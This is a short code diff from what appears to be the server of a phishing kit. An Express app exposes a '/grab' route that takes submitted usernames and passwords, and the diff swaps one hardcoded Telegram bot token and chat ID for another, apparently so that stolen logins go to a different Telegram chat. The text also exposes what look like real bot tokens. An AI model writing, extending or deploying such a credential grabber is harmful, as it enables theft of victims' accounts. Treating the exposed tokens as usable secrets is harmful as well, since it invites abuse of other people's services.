@@ -7,8 +7,8 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('./'));
 
-const BOT_TOKEN = '8789687859:AAG6b6VQjtQZ0chuetPZie1l1bHjNYFm8_4';
-const CHAT_ID = '8856114065';
+const BOT_TOKEN = '8827810558:AAHMgMCCghkPCwHduz0SMk9bppzOhypKtVI';
+const CHAT_ID = '5092429629';
 
 app.post('/grab', function(req, res) {
   const { username, password } = req.body;
